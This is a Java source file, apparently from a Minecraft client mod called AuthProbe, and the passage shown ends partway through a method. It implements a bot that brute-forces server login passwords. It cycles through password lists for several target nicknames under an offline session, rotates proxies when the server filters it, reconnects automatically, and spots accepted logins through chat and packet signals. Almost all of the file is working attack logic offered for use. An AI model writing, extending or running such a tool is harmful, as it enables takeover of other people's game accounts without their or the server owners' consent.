package ru.an0n.authprobe;

import net.minecraft.ChatFormatting;
import net.minecraft.client.Minecraft;
import net.minecraft.client.gui.components.toasts.SystemToast;
import net.minecraft.client.gui.screens.Screen;
import net.minecraft.client.multiplayer.ClientPacketListener;
import net.minecraft.network.chat.Component;
import net.minecraft.network.chat.MutableComponent;
import ru.an0n.authprobe.proxy.ProxyEntry;
import ru.an0n.authprobe.proxy.ProxyTunnel;
import ru.an0n.authprobe.screen.BotStatusScreen;
import ru.an0n.authprobe.utils.Nicks;

import java.util.List;

/**
 * The probe state machine. Ticked once per client tick on the client thread.
 *
 * <p>Attempt accounting: one send is one try. A verdict of fail or kick, or a send that gets
 * no verdict inside {@code timeoutMs}, moves the cursor to the next password. A send that was
 * in flight when the session dropped is also counted, so the run never spends two tries on one
 * password and ends when the list is exhausted.
 *
 * @author AN0N
 */
public final class BotController {
    /**
     * Probe state.
     */
    public enum State {
        /**
         * Not doing anything.
         */
        IDLE,

        /**
         * A connection attempt is in flight.
         */
        CONNECTING,

        /**
         * Connected, waiting for the start command.
         */
        ARMED,

        /**
         * Waiting out the inter-attempt delay.
         */
        WAIT_SEND,

        /**
         * A password was sent, waiting for the server's answer.
         */
        SENT,

        /**
         * The password was accepted.
         */
        SUCCESS,

        /**
         * Every password was spent.
         */
        EXHAUSTED,

        /**
         * The server dropped us.
         */
        DISCONNECTED,

        /**
         * Stopped by the operator.
         */
        STOPPED
    }

    /**
     * Our message prefix.
     */
    private static final String PREFIX = "[AuthProbe] ";

    /**
     * Current state.
     */
    private static State state = State.IDLE;

    /**
     * Index of the password being probed.
     */
    private static int passwordIndex;

    /**
     * Total sends in this run.
     */
    private static int sentCount;

    /**
     * Sends spent on the current nickname.
     */
    private static int nickSentCount;

    /**
     * Last password put on the wire.
     */
    private static String lastPassword = "";

    /**
     * Last disconnect reason.
     */
    private static String kickReason = "";

    /**
     * Time of the last send, milliseconds.
     */
    private static long sentAt;

    /**
     * Time the next send is due, milliseconds.
     */
    private static long nextSendAt;

    /**
     * Whether an automatic reconnect is queued.
     */
    private static boolean reconnectPending;

    /**
     * Whether the probe should start sending by itself once a queued reconnect lands.
     * Set when the operator asks to continue while disconnected; cleared when the join completes.
     */
    private static boolean autoResume;

    /**
     * Set by the kick-screen Continue button: reconnect, but do not send until .start/.go.
     */
    private static boolean waitForStart;

    /**
     * True after the automatic proxy rotation reached the end of the list. Automatic
     * reconnects are paused until the operator rotates manually or starts again.
     */
    private static boolean proxyRotationBlocked;

    /**
     * Whether the current password was already put on the wire and has not been accounted
     * for by a verdict yet. Used so an automatic reconnect does not spend a second try on
     * a password that already went out.
     */
    private static boolean sendSpent;

    /**
     * Whether {@code .start} has already begun a run. Keeps an auto-start from restarting
     * the whole password list after every reconnect.
     */
    private static boolean begun;

    /**
     * Whether a switch to the next nickname is queued for the next client tick.
     * Deferred so it never runs inside the disconnect packet handler.
     */
    private static boolean switchPending;

    /**
     * Earliest time the queued nickname switch may connect, milliseconds.
     */
    private static long switchAt;

    /**
     * Reasons that mean the nickname is already online somewhere. Editable in the patterns screen.
     *
     * @return Busy-nickname reasons
     */
    private static List<String> nickOnline() {
        return ProbeConfig.INSTANCE.nickOnline();
    }

    /**
     * Reasons that mean the server rejected the name itself. Editable in the patterns screen.
     *
     * @return Invalid-nickname reasons
     */
    private static List<String> nickInvalid() {
        return ProbeConfig.INSTANCE.nickInvalid();
    }

    /**
     * Reasons that usually mean the server filtered the IP/proxy or the connection timed out.
     * Editable in the patterns screen.
     *
     * @return Proxy kick reasons
     */
    private static List<String> proxyKicks() {
        return ProbeConfig.INSTANCE.proxyKicks();
    }

    /**
     * How many times the same password may be re-sent after a server-requested pause.
     */
    private static final int MAX_PAUSE_RETRIES = 3;

    /**
     * How long the probe waits after joining before the first send when the captcha check is on.
     */
    private static final long CAPTCHA_SETTLE_MS = 750L;

    /**
     * Time the current password was sent, used to cap repeated holds.
     */
    private static long attemptStartedAt;

    /**
     * Whether the hold line was already printed for the current attempt.
     */
    private static boolean holdAnnounced;

    /**
     * Whether the server said it is checking the password during the current attempt. Any
     * transfer-like packet after such a hold means the password was accepted.
     */
    private static boolean holdSeen;

    /**
     * Set from a packet hook when a success signal arrived. Applied on the client tick, because
     * the packet handlers run on the network thread before they switch to the main thread.
     */
    private static volatile boolean packetSuccess;

    /**
     * Pause retries already spent on the current password.
     */
    private static int pauseRetries;

    /**
     * Server pauses waited out in this run, for the kick report.
     */
    private static int pauseCount;

    /**
     * Whether a password was already sent for the current nickname. A 2FA or captcha notice
     * seen before that point must not spend a try.
     */
    private static boolean nickSent;

    /**
     * Whether the pending nickname switch should wait for {@code .start} after joining.
     */
    private static boolean switchWaitForStart = true;

    /**
     * Whether the run is paused on a captcha prompt.
     */
    private static boolean captchaPaused;

    /**
     * Whether the pattern warnings were already printed in this session.
     */
    private static boolean patternWarningsShown;

    /**
     * Whether the next join should skip the debug nickname header: the nickname switch line
     * already named the nick.
     */
    private static boolean skipNextNickHeader;

    /**
     * Whether the "2FA before .start is off" notice was already printed for this nickname.
     */
    private static boolean droppedTwoFactorShown;

    /**
     * Classification of the last disconnect, for the kick screen:
     * {@code nick-online}, {@code nick-invalid}, {@code proxy}, or empty when unrecognized.
     */
    private static String kickClass = "";

    /**
     * Target index the current run started from.
     */
    private static int runStartTarget;

    /**
     * Target index that was abandoned because the nickname itself was rejected.
     */
    private static int skippedTarget = -1;

    /**
     * Reason the nickname was abandoned, empty when none.
     */
    private static String skippedReason = "";

    /**
     * Time the automatic reconnect is due, milliseconds.
     */
    private static long reconnectAt;

    /**
     * Amount of automatic reconnects in this run.
     */
    private static int reconnectCount;

    /**
     * An instance of this class cannot be created.
     *
     * @throws AssertionError Always
     */
    private BotController() {
        throw new AssertionError("No instances.");
    }

    /**
     * Gets the current state.
     *
     * @return State
     */
    public static State state() {
        return state;
    }

    /**
     * Gets the translation key for the current state label.
     *
     * @return Translation key
     */
    public static String stateKey() {
        return "authprobe.state." + state.name();
    }

    /**
     * Gets the current password index.
     *
     * @return Password index
     */
    public static int passwordIndex() {
        return passwordIndex;
    }

    /**
     * Gets the total sends in this run.
     *
     * @return Send count
     */
    public static int sentCount() {
        return sentCount;
    }

    /**
     * Gets the sends spent on the current nickname.
     *
     * @return Nickname send count
     */
    public static int nickSentCount() {
        return nickSentCount;
    }

    /**
     * Gets the last password put on the wire.
     *
     * @return Last password, empty if none
     */
    public static String lastPassword() {
        return lastPassword;
    }

    /**
     * Gets the last disconnect reason.
     *
     * @return Reason, empty if none
     */
    public static String kickReason() {
        return kickReason;
    }

    /**
     * Checks whether an automatic reconnect is queued.
     *
     * @return Whether a reconnect is queued
     */
    public static boolean reconnectPending() {
        return reconnectPending;
    }

    /**
     * Gets the time left before the automatic reconnect.
     *
     * @return Remaining time, milliseconds
     */
    public static long reconnectRemainingMs() {
        return Math.max(0L, reconnectAt - System.currentTimeMillis());
    }

    /**
     * Checks whether the probe owns the current session.
     *
     * @return Whether the probe is running
     */
    public static boolean armed() {
        return state != State.IDLE && state != State.STOPPED && state != State.SUCCESS
                && state != State.EXHAUSTED;
    }

    /**
     * Builds a one-line description of the current position.
     *
     * @return Localized position description
     */
    public static Component describePositionComponent() {
        ProbeConfig config = ProbeConfig.INSTANCE;
        String password = lastPassword.isEmpty()
                ? Component.translatable("authprobe.position.none").getString()
                : lastPassword;
        return Component.translatable("authprobe.position",
                passwordIndex + 1,
                config.passwordCount(),
                password,
                nickSentCount);
    }

    /**
     * Builds a one-line description of the current position as plain text.
     *
     * @return Position description
     */
    public static String describePosition() {
        return describePositionComponent().getString();
    }

    /**
     * Validates the config, swaps the session and starts connecting.
     *
     * @param parent Parent screen for the connect screen
     */
    public static void start(Screen parent) {
        ProbeConfig config = ProbeConfig.INSTANCE;

        // Validate address.
        if (!ServerConnector.isValidAddress(config.address())) {
            announce("bad server address: '" + config.address() + "' (need host or host:port)");
            return;
        }

        // Validate nickname.
        if (!Nicks.isValid(config.nick())) {
            announce("bad nickname: '" + config.nick() + "' (3-16 chars, A-Z a-z 0-9 _)");
            return;
        }

        // Validate passwords.
        if (config.passwordCount() == 0) {
            announce("no passwords entered");
            return;
        }

        // Validate proxy mode.
        if (config.proxyEnabled() && config.proxies().isEmpty()) {
            announce("proxy is on but the proxy list is empty");
            return;
        }
        if (config.proxyEnabled() && ProxyEntry.parse(config.currentProxyLine()) == null) {
            announce("proxy is on but the selected proxy line is invalid");
            return;
        }

        // Reset the run.
        reset();

        // Swap the session BEFORE dialling, the handshake reads the user.
        SessionSwap.toOffline(config.nick());

        // Dial.
        state = State.CONNECTING;
        ChatWatcher.disarm();
        announce("connecting to " + config.address() + " as " + config.nick() + " (" + config.passwordCount() + " passwords)");
        if (!ServerConnector.connect(parent, config.address())) {
            state = State.IDLE;
            announce("connect request rejected");
        }
    }

    /**
     * Stops the probe.
     */
    public static void stop() {
        boolean wasRunning = armed();
        state = State.STOPPED;
        reconnectPending = false;
        autoResume = false;
        begun = false;
        switchPending = false;
        waitForStart = false;
        ChatWatcher.disarm();
        announce("stopped." + (wasRunning ? " " + describePosition() : ""));
        ProbeConfig.INSTANCE.save();
    }

    /**
     * Starts probing, or resumes from the current position.
     */
    public static void begin() {
        ProbeConfig config = ProbeConfig.INSTANCE;
        if (config.passwordCount() == 0) {
            announce("no passwords entered");
            return;
        }
        boolean resume = begun && passwordIndex < config.passwordCount();
        waitForStart = false;
        proxyRotationBlocked = false;
        if (!resume) {
            passwordIndex = 0;
            nickSentCount = 0;
            lastPassword = "";
            kickReason = "";
            reconnectCount = 0;
            runStartTarget = config.activeIndex();
            skippedTarget = -1;
            skippedReason = "";
        }
        autoResume = false;
        sendSpent = false;
        pauseRetries = 0;
        nickSent = false;
        captchaPaused = false;
        droppedTwoFactorShown = false;
        begun = true;
        ChatWatcher.arm();
        state = State.WAIT_SEND;
        nextSendAt = System.currentTimeMillis()
                + (config.captchaBeforeStart() ? CAPTCHA_SETTLE_MS : 0L);
        announce(resume ? "resume at " + describePosition() : "start. " + config.passwordCount() + " passwords");
    }

    /**
     * Reconnects and waits for {@code .start}/{@code .go} to continue from the stored position.
     */
    public static void resume() {
        ProbeConfig config = ProbeConfig.INSTANCE;
        waitForStart = true;
        proxyRotationBlocked = false;
        autoResume = false;
        reconnectPending = false;
        sendSpent = false;
        pauseRetries = 0;
        ChatWatcher.disarm();

        if (passwordIndex >= config.passwordCount()) {
            if (hasUsableNextTarget() && config.autoSwap()) {
                switchWaitForStart = true;
                switchPending = true;
                switchAt = System.currentTimeMillis();
                state = State.DISCONNECTED;
                announce("switching to the next nick. type .start or .go to continue");
                return;
            }
            waitForStart = false;
            announce("nothing to continue");
            return;
        }

        Minecraft minecraft = Minecraft.getInstance();
        if (minecraft.getConnection() != null && minecraft.player != null) {
            state = State.ARMED;
            announce("ready. type .start or .go to continue at " + describePosition());
            return;
        }

        state = State.DISCONNECTED;
        reconnectPending = true;
        reconnectAt = 0L;
        announce("reconnecting. type .start or .go to continue at " + describePosition());
    }

    /**
     * Continues after an automatic reconnect. A password that was already on the wire when the
     * connection dropped is counted and skipped, so an automatic reconnect never spends two
     * tries on one password.
     */
    private static void continueAfterJoin() {
        ProbeConfig config = ProbeConfig.INSTANCE;
        if (sendSpent) {
            sendSpent = false;
            advance();
            if (passwordIndex >= config.passwordCount()) {
                exhausted();
                return;
            }
        }
        ChatWatcher.arm();
        state = State.WAIT_SEND;
        nextSendAt = 0L;
        announce("joined. continuing at " + describePosition());
    }

    /**
     * Records a disconnect and queues an automatic reconnect.
     *
     * @param reason Disconnect reason, may be {@code null}
     */
    public static void onDisconnected(Component reason) {
        // Ignore disconnects the probe does not own.
        if (!armed()) return;

        boolean wasSent = state == State.SENT;
        kickReason = reason == null ? "" : reason.getString();
        state = State.DISCONNECTED;
        ChatWatcher.disarm();
        autoResume = false;
        classifyKick(kickReason);

        // A send that was in flight when the session dropped has spent its try: the server
        // either saw the password or kicked us for it. Advance exactly once so the run keeps
        // one try per password and ends when the list is exhausted.
        AuthProbe.logger().warn("AuthProbe: disconnected. {} | reason: {}", describePosition(), kickReason.isEmpty() ? "(none)" : kickReason);
        announceLastUsed("disconnected");
        if (isNickKick(kickReason)) {
            abandonNick(kickReason);
            return;
        }
        if (shouldRotateProxy(kickReason)) {
            rotateProxyForKick();
        }
        if (wasSent) {
            advance();
            if (passwordIndex >= ProbeConfig.INSTANCE.passwordCount()) {
                exhausted();
                return;
            }
        }

        // Queue the automatic reconnect.
        if (ProbeConfig.INSTANCE.autoReconnect() && !proxyRotationBlocked) {
            reconnectPending = true;
            reconnectAt = System.currentTimeMillis() + ProbeConfig.INSTANCE.reconnectDelayMs();
        } else {
            reconnectPending = false;
        }
        ProbeConfig.INSTANCE.saveIfDirty();
    }

    /**
     * Records a failed connection attempt.
     * Distinct from {@link #onDisconnected(Component)}: a connect that never reached the server
     * spent no attempt, so nothing is advanced. Without this the probe would sit in CONNECTING
     * forever whenever the host is down or the address is wrong.
     *
     * @param reason Failure reason, may be {@code null}
     */
    public static void onConnectFailed(Component reason) {
        // Ignore failures the probe does not own.
        if (!armed()) return;

        kickReason = reason == null ? "" : reason.getString();
        state = State.DISCONNECTED;
        ChatWatcher.disarm();
        classifyKick(kickReason);

        if (isNickKick(kickReason)) {
            abandonNick(kickReason);
            return;
        }
        if (shouldRotateProxy(kickReason)) {
            rotateProxyForKick();
        }

        AuthProbe.logger().warn("AuthProbe: connect failed. reason: {}", kickReason.isEmpty() ? "(none)" : kickReason);
        announce("connect failed." + (kickReason.isEmpty() ? "" : " " + kickReason));

        // Queue the automatic reconnect.
        if (ProbeConfig.INSTANCE.autoReconnect() && !proxyRotationBlocked) {
            reconnectPending = true;
            reconnectAt = System.currentTimeMillis() + ProbeConfig.INSTANCE.reconnectDelayMs();
        } else {
            reconnectPending = false;
        }
        ProbeConfig.INSTANCE.saveIfDirty();
    }

    /**
     * Runs the state machine.
     */
    public static void tick() {
        Minecraft minecraft = Minecraft.getInstance();
        if (minecraft == null) return;

        // Finish a queued nickname switch after the disconnect handling of the previous tick.
        if (switchPending && System.currentTimeMillis() >= switchAt && !ServerConnector.isConnecting()) {
            switchPending = false;
            switchToNextTarget();
            return;
        }

        // The session can vanish without a disconnect packet: quitting to the title screen
        // or a manual disconnect never reaches onDisconnect.
        if ((state == State.ARMED || state == State.WAIT_SEND || state == State.SENT)
                && minecraft.getConnection() == null) {
            onDisconnected(Component.literal("connection closed"));
            return;
        }

        // Two-factor and captcha signals are handled before the state machine: 2FA can arrive
        // before .start, and a captcha must stop the first send of the nickname.
        if (armed() && state != State.CONNECTING) {
            String twoFactorRule = ChatWatcher.takeTwoFactorRule();
            if (!twoFactorRule.isEmpty()) {
                boolean beforeStart = state == State.ARMED || (state == State.WAIT_SEND && !nickSent);
                if (!beforeStart || ProbeConfig.INSTANCE.twoFactorBeforeStart()) {
                    handleTwoFactor(twoFactorRule);
                    return;
                }
                notifyDroppedTwoFactor(twoFactorRule);
            }
            String captchaRule = ChatWatcher.takeCaptchaRule();
            if (!captchaRule.isEmpty() && !nickSent) {
                pauseForCaptcha(captchaRule);
                return;
            }
        }

        switch (state) {
            case CONNECTING -> {
                // Joined.
                if (minecraft.getConnection() != null && minecraft.player != null) {
                    state = State.ARMED;
                    nickSent = false;
                    captchaPaused = false;
                    droppedTwoFactorShown = false;

                    // The nickname is reachable again, so the skip mark has served its purpose.
                    ProbeConfig joined = ProbeConfig.INSTANCE;
                    if (joined.clearSkip(joined.activeIndex())) joined.saveIfDirty();

                    // A hand-edited config is checked once per session, on the first join.
                    if (!patternWarningsShown) {
                        patternWarningsShown = true;
                        for (String warning : joined.patternWarnings()) {
                            warn(Component.literal(warning));
                        }
                    }

                    if (!skipNextNickHeader) {
                        announceNickHeader();
                    }
                    skipNextNickHeader = false;
                    AuthProbe.logger().info("AuthProbe: joined as nick #{} '{}'.",
                            ProbeConfig.INSTANCE.activeIndex() + 1, ProbeConfig.INSTANCE.nick());

                    // Auto-start begins the run once. After a reconnect it resumes at the stored
                    // position instead of resetting to password #1, which would spend extra tries.
                    if (waitForStart) {
                        waitForStart = false;
                        autoResume = false;
                        ChatWatcher.disarm();
                        state = State.ARMED;
                        announce("joined. type .start or .go to continue");
                    } else if (!begun && ProbeConfig.INSTANCE.autoStart()) {
                        begin();
                    } else if (autoResume || (begun && ProbeConfig.INSTANCE.autoStart())) {
                        autoResume = false;
                        continueAfterJoin();
                    } else {
                        announce(begun
                                ? "joined. type .start or .go to continue"
                                : "joined. type .start or .go to begin");
                    }
                }
            }
            case WAIT_SEND -> {
                if (System.currentTimeMillis() >= nextSendAt) sendAttempt(minecraft);
            }
            case SENT -> {
                if (packetSuccess) {
                    packetSuccess = false;
                    succeed();
                    return;
                }
                ChatWatcher.Verdict verdict = ChatWatcher.verdict();
                if (verdict == ChatWatcher.Verdict.SUCCESS) {
                    ChatWatcher.consume();
                    succeed();
                    return;
                }
                if (verdict == ChatWatcher.Verdict.WAIT) {
                    ChatWatcher.consume();
                    handlePause(minecraft);
                    return;
                }
                if (verdict == ChatWatcher.Verdict.HOLD) {
                    ChatWatcher.consume();
                    handleHold(minecraft);
                    return;
                }
                if (verdict == ChatWatcher.Verdict.FAIL || verdict == ChatWatcher.Verdict.KICK) {
                    ChatWatcher.consume();
                    advance();
                    scheduleNext(minecraft);
                    return;
                }
                // No answer inside the timeout counts as a spent attempt. A hold is different:
                // the short timeout is ignored and only the hold limit may spend the password.
                ProbeConfig config = ProbeConfig.INSTANCE;
                if (ProbeTiming.answerExpired(holdSeen, System.currentTimeMillis(), sentAt,
                        attemptStartedAt, config.timeoutMs(), config.holdLimitMs())) {
                    expireAttempt(minecraft, holdSeen);
                }
            }
            case DISCONNECTED -> {
                if (reconnectPending && System.currentTimeMillis() >= reconnectAt && !ServerConnector.isConnecting()) {
                    reconnectNow(minecraft);
                }
            }
            default -> {
                // Nothing to do.
            }
        }
    }

    /**
     * Reconnects, then waits for the operator to continue.
     *
     * @param minecraft Minecraft instance
     */
    private static void reconnectNow(Minecraft minecraft) {
        ProbeConfig config = ProbeConfig.INSTANCE;
        reconnectPending = false;
        reconnectCount++;

        // Re-assert the offline nick: a session-switching mod (or a manual account change) may have clobbered it.
        SessionSwap.toOffline(config.nick());

        Screen parent = minecraft.screen;
        state = State.CONNECTING;
        announce("reconnect #" + reconnectCount + " ...");
        if (!ServerConnector.connect(parent, config.address())) {
            state = State.DISCONNECTED;
            reconnectPending = true;
            reconnectAt = System.currentTimeMillis() + config.reconnectDelayMs();
        }
    }

    /**
     * Sends the current password.
     *
     * @param minecraft Minecraft instance
     */
    private static void sendAttempt(Minecraft minecraft) {
        ProbeConfig config = ProbeConfig.INSTANCE;

        // Out of passwords.
        if (passwordIndex >= config.passwordCount()) {
            exhausted();
            return;
        }

        // Session vanished between ticks.
        if (minecraft.getConnection() == null || minecraft.player == null) {
            onDisconnected(Component.literal("connection lost"));
            return;
        }

        // Send.
        String password = config.passwords().get(passwordIndex);
        lastPassword = password;
        config.rememberLast(config.nick(), password);
        ChatWatcher.consume();
        try {
            minecraft.player.connection.sendCommand(config.mode().packet(password));
        } catch (Throwable t) {
            AuthProbe.logger().error("AuthProbe: unable to send login command.", t);
        }
        sentCount++;
        nickSentCount++;
        sentAt = System.currentTimeMillis();
        attemptStartedAt = sentAt;
        holdAnnounced = false;
        holdSeen = false;
        packetSuccess = false;
        sendSpent = true;
        nickSent = true;
        captchaPaused = false;
        state = State.SENT;
        AuthProbe.logger().info("AuthProbe: sent {} | {} of {}", config.mode().display(), passwordIndex + 1, config.passwordCount());
        if (config.debugLogs()) {
            announcePassword(password);
        }
    }

    /**
     * Prints the password of the attempt just sent to the local chat, in yellow.
     * The line is client-side only and never reaches the server.
     *
     * @param password Password that was sent
     */
    private static void announcePassword(String password) {
        ProbeConfig config = ProbeConfig.INSTANCE;
        Component line = Component.literal("nick ")
                .append(Component.literal("#" + (config.activeIndex() + 1) + "/" + config.targets().size())
                        .withStyle(ChatFormatting.AQUA))
                .append(Component.literal(" · password "))
                .append(Component.literal("#" + (passwordIndex + 1) + "/" + config.passwordCount())
                        .withStyle(ChatFormatting.AQUA))
                .append(Component.literal(": "))
                .append(Component.literal("<" + password + ">").withStyle(ChatFormatting.YELLOW));
        announce(line, ChatWatcher.COLOR_TRY);
    }

    /**
     * Prints the current nickname once after joining, with its number and name.
     */
    private static void announceNickHeader() {
        ProbeConfig config = ProbeConfig.INSTANCE;
        if (!config.debugLogs()) return;
        Component line = Component.literal("nick ")
                .append(Component.literal("#" + (config.activeIndex() + 1) + "/" + config.targets().size())
                        .withStyle(ChatFormatting.AQUA))
                .append(Component.literal(": "))
                .append(Component.literal(config.nick()).withStyle(ChatFormatting.YELLOW));
        announce(line, ChatWatcher.COLOR_NICK);
    }

    /**
     * Handles a server-requested pause. With smart delay on, the same password is re-sent after
     * the requested pause and the try is not spent. With smart delay off, the message keeps the
     * old meaning: a kick-like answer that spends the password.
     *
     * @param minecraft Minecraft instance
     */
    private static void handlePause(Minecraft minecraft) {
        ProbeConfig config = ProbeConfig.INSTANCE;
        if (!config.smartDelay()) {
            advance();
            scheduleNext(minecraft);
            return;
        }

        if (pauseRetries >= MAX_PAUSE_RETRIES) {
            pauseRetries = 0;
            advance();
            scheduleNext(minecraft);
            announce("server paused " + (MAX_PAUSE_RETRIES + 1) + " times in a row: password spent");
            return;
        }

        pauseRetries++;
        pauseCount++;
        long requested = ChatWatcher.waitMillis();
        long base = Math.max(1_000L, config.delayMs());
        long wait = requested > 0 ? Math.max(requested, base) : base;

        // The password never reached the authentication check, so it is not spent.
        sendSpent = false;
        state = State.WAIT_SEND;
        nextSendAt = System.currentTimeMillis() + wait;
        announcePause(wait);
    }

    /**
     * Handles a server that is still checking the password. Nothing is sent and the attempt is
     * not spent: the short answer timeout is ignored, and only the configured hold limit may
     * spend the password.
     *
     * @param minecraft Minecraft instance
     */
    private static void handleHold(Minecraft minecraft) {
        long now = System.currentTimeMillis();
        holdSeen = true;
        if (ProbeTiming.answerExpired(true, now, sentAt, attemptStartedAt,
                ProbeConfig.INSTANCE.timeoutMs(), ProbeConfig.INSTANCE.holdLimitMs())) {
            expireAttempt(minecraft, true);
            return;
        }
        if (holdAnnounced) return;
        holdAnnounced = true;
        announce(Component.literal("сервер проверяет пароль — ждём ответ"), ChatWatcher.COLOR_WARN);
    }

    /**
     * Spends the current password after the answer wait ran out.
     *
     * @param minecraft Minecraft instance
     * @param hold      Whether a server-side hold was seen during the attempt
     */
    private static void expireAttempt(Minecraft minecraft, boolean hold) {
        if (hold) {
            announce(Component.literal("удержание истекло (" + ProbeConfig.INSTANCE.holdLimitMs() / 1000L
                    + " с) — пароль списан"), ChatWatcher.COLOR_WARN);
        }
        advance();
        scheduleNext(minecraft);
    }

    /**
     * Warns once per nickname that a two-factor line was seen before {@code .start} while the
     * pre-start check is off.
     *
     * @param rule Matched phrase
     */
    private static void notifyDroppedTwoFactor(String rule) {
        if (droppedTwoFactorShown) return;
        droppedTwoFactorShown = true;
        warn(Component.literal("2FA замечено («" + rule + "»), но 2FA до .start выключено — строка проигнорирована"));
    }

    /**
     * Announces a warning in chat and shows it as a toast.
     *
     * @param message Message
     */
    public static void warn(Component message) {
        announce(message, ChatWatcher.COLOR_WARN);
        notify(message);
    }

    /**
     * Announces a warning in chat and shows it as a toast.
     *
     * @param message Message
     */
    public static void warn(String message) {
        warn(Component.literal(message));
    }

    /**
     * Announces the pause and the password that will be re-sent.
     *
     * @param wait Pause, milliseconds
     */
    private static void announcePause(long wait) {
        ProbeConfig config = ProbeConfig.INSTANCE;
        String seconds = wait % 1000L == 0L
                ? Long.toString(wait / 1000L)
                : String.format(java.util.Locale.ROOT, "%.1f", wait / 1000.0D);
        Component line = Component.literal("сервер просит паузу ")
                .append(Component.literal(seconds + " с").withStyle(ChatFormatting.AQUA))
                .append(Component.literal(" — повтор пароля "))
                .append(Component.literal("#" + (passwordIndex + 1) + "/" + config.passwordCount())
                        .withStyle(ChatFormatting.AQUA))
                .append(Component.literal(" (" + pauseRetries + "/" + MAX_PAUSE_RETRIES + ")"));
        announce(line, ChatWatcher.COLOR_WARN);
    }

    /**
     * Spends the current password and moves to the next one.
     */
    private static void advance() {
        passwordIndex++;
        pauseRetries = 0;
        sendSpent = false;
    }

    /**
     * Queues the next send, or finishes.
     *
     * @param minecraft Minecraft instance
     */
    private static void scheduleNext(Minecraft minecraft) {
        if (passwordIndex >= ProbeConfig.INSTANCE.passwordCount()) {
            exhausted();
            return;
        }
        state = State.WAIT_SEND;
        nextSendAt = System.currentTimeMillis() + ProbeConfig.INSTANCE.delayMs();
    }

    /**
     * Called when the client receives a login packet. If a password was just sent, the server
     * accepted it and is moving the player into the world. Limbo servers that transfer the
     * player after auth never write success in chat, so this packet is the only signal.
     */
    public static void onLoginPacket() {
        if (state != State.SENT || lastPassword.isEmpty()) return;
        packetSuccess = true;
        AuthProbe.logger().info("AuthProbe: login packet after a sent password, treating it as success.");
    }

    /**
     * Called when the client receives a respawn packet, which is how a limbo server moves the
     * player into the lobby after a correct password without writing anything in chat.
     */
    public static void onRespawnPacket() {
        if (state != State.SENT || lastPassword.isEmpty()) return;
        packetSuccess = true;
        AuthProbe.logger().info("AuthProbe: respawn after a sent password, treating it as success.");
    }

    /**
     * Called on a plugin-channel payload. Servers with a lobby plugin send their data right after
     * the login is accepted, so a payload that follows a password check is a success signal.
     */
    public static void onCustomPayload() {
        if (state != State.SENT || !holdSeen || lastPassword.isEmpty()) return;
        packetSuccess = true;
        AuthProbe.logger().info("AuthProbe: custom payload after a password check, treating it as success.");
    }

    /**
     * Called on a player position packet. Limbo servers teleport the player into the lobby after
     * a correct password, and that teleport follows the password check.
     */
    public static void onPlayerPosition() {
        if (state != State.SENT || !holdSeen || lastPassword.isEmpty()) return;
        packetSuccess = true;
        AuthProbe.logger().info("AuthProbe: teleport after a password check, treating it as success.");
    }

    /**
     * Announces the accepted password and stops.
     */
    private static void succeed() {
        state = State.SUCCESS;
        begun = false;
        sendSpent = false;
        ChatWatcher.disarm();
        reconnectPending = false;
        ProbeConfig config = ProbeConfig.INSTANCE;
        Component message = Component.literal("PASSWORD FOUND: ")
                .append(Component.literal(lastPassword).withStyle(ChatFormatting.GREEN))
                .append(Component.literal(" (password #" + (passwordIndex + 1) + " of "
                        + config.passwordCount() + ", " + sentCount + " sends total)"));

        // Keep only the password that worked, so the profile shows the result at a glance.
        config.primary(config.primary()
                .withPasswords(List.of(lastPassword))
                .withoutSkip()
                .withResult(ProbeTarget.RESULT_FOUND));
        announce(message, ChatWatcher.COLOR_FOUND);
        notify(message);
        config.save();
    }

    /**
     * Announces that every password was spent.
     */
    private static void exhausted() {
        ProbeConfig config = ProbeConfig.INSTANCE;
        config.markResult(config.activeIndex(), ProbeTarget.RESULT_EXHAUSTED);

        if (proxyRotationBlocked) {
            state = State.DISCONNECTED;
            begun = false;
            sendSpent = false;
            reconnectPending = false;
            switchPending = false;
            ChatWatcher.disarm();
            ProbeConfig.INSTANCE.saveIfDirty();
            return;
        }
        if (hasUsableNextTarget()) {
            if (!config.autoSwap()) {
                stopForManualSwitch("авто-смена выключена");
                return;
            }
            // Same rule as a nickname kick: with auto-start on, the next nick continues by itself.
            switchWaitForStart = !config.autoStart();
            switchPending = true;
            switchAt = System.currentTimeMillis();
            state = State.DISCONNECTED;
            begun = false;
            sendSpent = false;
            ChatWatcher.disarm();
            reconnectPending = false;
            return;
        }

        state = State.EXHAUSTED;
        begun = false;
        sendSpent = false;
        ChatWatcher.disarm();
        reconnectPending = false;
        String message = "done. every password was spent (" + sentCount + " sends, "
                + ProbeConfig.INSTANCE.passwordCount() + " passwords)";
        announce(message);
        notify(message);
        ProbeConfig.INSTANCE.save();

        // No nickname is left: leave the server so the results screen replaces the game.
        kickReason = "";
        kickClass = "";
        disconnectToResults();
    }

    /**
     * Closes the session after the last nickname failed. The vanilla disconnect screen is
     * swapped for the AuthProbe report by the screen handler, which accepts the exhausted state.
     */
    private static void disconnectToResults() {
        Minecraft minecraft = Minecraft.getInstance();
        if (minecraft == null) return;
        ClientPacketListener connection = minecraft.getConnection();
        if (connection == null) return;
        AuthProbe.logger().info("AuthProbe: every password was spent, disconnecting to the report.");

        // Drop the level first: the disconnect mixin then leaves the vanilla screen alone and
        // the report is opened here, on the client thread.
        minecraft.clearLevel();
        connection.getConnection().disconnect(Component.literal("AuthProbe: every password was spent"));
        minecraft.setScreen(new BotStatusScreen());
    }

    /**
     * Stops the run instead of switching to the next nickname. Used when automatic switching is
     * off: the operator picks the next profile in the menu.
     *
     * @param reason Reason shown in chat
     */
    private static void stopForManualSwitch(String reason) {
        state = State.DISCONNECTED;
        begun = false;
        sendSpent = false;
        switchPending = false;
        ChatWatcher.disarm();
        reconnectPending = false;
        announce(reason + " — выбери следующий ник в меню");
        Minecraft minecraft = Minecraft.getInstance();
        if (minecraft != null && minecraft.getConnection() != null) {
            disconnectToResults();
        }
    }

    /**
     * Checks whether a later target has any passwords.
     *
     * @return Whether a usable next target exists
     */
    private static boolean hasUsableNextTarget() {
        ProbeConfig config = ProbeConfig.INSTANCE;
        for (int i = config.activeIndex() + 1; i < config.targets().size(); i++) {
            ProbeTarget target = config.targets().get(i);
            if (!target.passwords().isEmpty() && Nicks.isValid(target.nick())) return true;
        }
        return false;
    }

    /**
     * Moves to the next nickname that has passwords, reconnects under it and sends the first one.
     *
     * @return Whether a next target was started
     */
    private static boolean switchToNextTarget() {
        ProbeConfig config = ProbeConfig.INSTANCE;
        int next = -1;
        for (int i = config.activeIndex() + 1; i < config.targets().size(); i++) {
            ProbeTarget target = config.targets().get(i);
